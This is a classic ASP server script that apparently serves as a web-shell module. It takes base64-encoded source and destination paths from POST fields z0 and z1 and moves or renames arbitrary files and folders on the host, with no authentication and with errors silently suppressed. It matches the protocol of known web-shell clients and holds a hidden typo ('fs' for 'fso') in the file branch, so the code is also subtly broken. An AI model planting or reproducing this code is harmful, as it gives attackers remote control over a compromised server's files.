<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64DecodeToText(byVal strIn)
    Dim xmlDoc, xmlNode
    Set xmlDoc = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.dataType = "bin.base64"
    xmlNode.text = strIn
    
    Dim objStream
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write xmlNode.nodeTypedValue
    objStream.Position = 0
    objStream.Type = 2 ' Text
    objStream.Charset = GetCurrentCharset()
    Base64DecodeToText = objStream.ReadText
    
    objStream.Close
    Set objStream = Nothing
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Dim fso
Set fso = Server.CreateObject("Scripting.FileSystemObject")

Dim srcPath, dstPath
srcPath = Base64DecodeToText(Request.Form("z0"))
dstPath = Base64DecodeToText(Request.Form("z1"))

If fso.FolderExists(srcPath) Then
    If Not fso.FolderExists(dstPath) Then
        fso.MoveFolder srcPath, dstPath
    Else
        Response.Write "0|Destination already exists."
    End If
ElseIf fso.FileExists(srcPath) Then
    If Not fs.FileExists(dstPath) Then
        fso.MoveFile srcPath, dstPath
    Else
        Response.Write "0|Destination already exists."
    End If
Else
    Response.Write "0|Source does not exist."
End If

If Err.Number = 0 Then
    Response.Write "1|"
Else
    Response.Write "0|" & Err.Description
    Err.Clear()
End If

Set fso = Nothing

%>